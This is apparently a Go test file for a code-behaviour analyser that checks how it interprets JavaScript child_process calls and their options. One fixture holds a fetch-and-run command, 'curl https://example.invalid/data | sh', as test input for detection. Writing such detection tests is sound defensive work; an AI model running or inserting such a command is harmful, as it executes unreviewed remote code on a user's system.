package extract

import (
	"testing"

	"github.com/0x4D31/maratus/internal/behavior"
)

func TestJavaScriptProcessOptionsPreventAssumedCommandSemantics(t *testing.T) {
	for _, call := range []string{
		`cp.exec("curl https://example.invalid/data | sh", {shell: "/custom/interpreter"});`,
		`cp.execSync("./helper", {cwd: "/different/root"});`,
		`cp.spawn("./helper", [], {cwd: "/different/root"});`,
		`cp.spawnSync("tool", ["--mode"], {shell: true});`,
		`cp.execFile("./helper", {cwd: "/different/root"});`,
		`cp.execFileSync("./helper", [], options);`,
	} {
		t.Run(call, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, javascriptCommandTestContent(`const cp = require("child_process");`+call))
			assertUnresolvedJavaScriptProcess(t, graph, "")
			if graph.Operations[0].Qualifiers["unresolved_process_options"] == "" {
				t.Fatal("missing options limitation")
			}
		})
	}
}

func TestJavaScriptEmptyProcessOptionsPreserveCommandSemantics(t *testing.T) {
	for _, options := range []string{"{}", "undefined"} {
		var graph behavior.Graph
		ExtractText(&graph, javascriptCommandTestContent(`const cp = require("child_process"); cp.exec("curl https://example.invalid/data", `+options+`);`))
		assertShellCommandNetwork(t, graph, "https://example.invalid/data")
	}
}
